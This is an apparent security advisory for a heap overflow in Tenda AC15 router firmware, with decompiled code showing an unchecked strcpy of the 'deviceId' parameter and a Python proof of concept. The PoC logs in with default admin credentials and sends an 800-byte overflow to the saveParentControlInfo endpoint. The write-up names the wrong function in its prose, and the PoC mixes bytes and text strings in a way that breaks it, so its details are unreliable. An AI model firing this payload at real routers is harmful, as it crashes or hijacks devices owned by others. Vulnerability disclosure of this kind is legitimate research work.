## Tenda AC15 multiple heap overflow vulnerability

### * Version

V15.03.05.19 (US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin)

### * Firmware
[https://www.tenda.com.cn/download/detail-2680.html](https://www.tenda.com.cn/download/detail-2680.html)




### * Vulnerability Detail

In function formExpandDlnaFile, the content obtained by the program from the parameter "deviceId" is passed to local_28, 
and then the local_28 is directly copied into the local_50 heap through the strcpy function.
There is no size check, so there is a heap overflow vulnerability. The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.


```c
void saveParentControlInfo(undefined4 param_1)

{
  int iVar1;
  undefined uVar2;
  bool bVar3;
  undefined4 local_3d8;
  undefined4 local_3d4;
  undefined4 local_3d0;
  undefined4 local_3cc;
  undefined4 local_3c8;
  undefined4 local_3c4;
  undefined4 local_3c0;
  undefined4 local_3bc;
  undefined4 local_3b8;
  undefined4 local_3b4;
  undefined4 local_3b0;
  undefined4 local_3ac;
  undefined4 local_3a8;
  undefined4 local_3a4;
  undefined4 local_3a0;
  undefined4 local_39c;
  int local_398;
  char acStack916 [128];
  int aiStack788 [30];
  undefined4 local_29c;
  undefined2 local_298;
  char local_296 [2];
  undefined auStack660 [512];
  undefined auStack148 [64];
  undefined *local_54;
  void *local_50;
  char *local_4c;
  char *local_48;
  undefined4 local_44;
  char *local_40;
  char *local_3c;
  char *local_38;
  char *local_34;
  char *local_30;
  char *local_2c;
  char *local_28;
  undefined4 local_24;
  undefined4 local_20;
  int local_1c;
  int local_18;
  int local_14;
  
  memset(auStack148,0,0x40);
  memset(auStack660,0,0x200);
  local_29c = 0;
  local_298 = 0;
  local_296[0] = '\0';
  local_18 = 0;
  local_1c = 0;
  local_14 = 0;
  memset(aiStack788,0,0x78);
  memset(acStack916,0,0x80);
  local_20 = 0;
  local_398 = 0;
  local_24 = 0;
  local_28 = (char *)FUN_0002ba8c(param_1,"deviceId",&DAT_000edd28);  //here
  local_2c = (char *)FUN_0002ba8c(param_1,"enable",&DAT_000edd28);
  local_30 = (char *)FUN_0002ba8c(param_1,"time",&DAT_000edd28);
  local_34 = (char *)FUN_0002ba8c(param_1,"url_enable",&DAT_000edd28);
  local_38 = (char *)FUN_0002ba8c(param_1,"urls",&DAT_000edd28);
  local_3c = (char *)FUN_0002ba8c(param_1,"day",&DAT_000edd28);
  local_40 = (char *)FUN_0002ba8c(param_1,"block",&DAT_000edd28);
  local_44 = FUN_0002ba8c(param_1,"connectType",&DAT_000edd28);
  local_48 = (char *)FUN_0002ba8c(param_1,"limit_type",&DAT_000eddc8);
  local_4c = (char *)FUN_0002ba8c(param_1,"deviceName",&DAT_000edd28);
  ...
  local_50 = malloc(0x254); //alloc memory
  memset(local_50,0,0x254); 
  strcpy((char *)((int)local_50 + 2),local_28); //here is overflow
  local_54 = (undefined *)malloc(0x254);
  memset(local_54,0,0x254);
  SetValue("parent.global.en",&DAT_000eddc8);
  SetValue("filter.url.en",&DAT_000eddc8);
  SetValue("filter.mac.en",&DAT_000eddc8);
  strcpy(local_54 + 2,local_28);  //here is overflow
  strcpy(local_54 + 0x22,local_30);
  ...
}
```

### * POC
```python
import requests


cmd  = b'deviceId=' + b'A' * 800 + '&enable=&time=&url_enable=&urls=&day=&block=&connectType=&limit_type='
cmd += b'&deviceName='


url = b"http://192.168.2.2/login/Auth"
payload = b"http://192.168.2.2/goform/saveParentControlInfo/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()

```
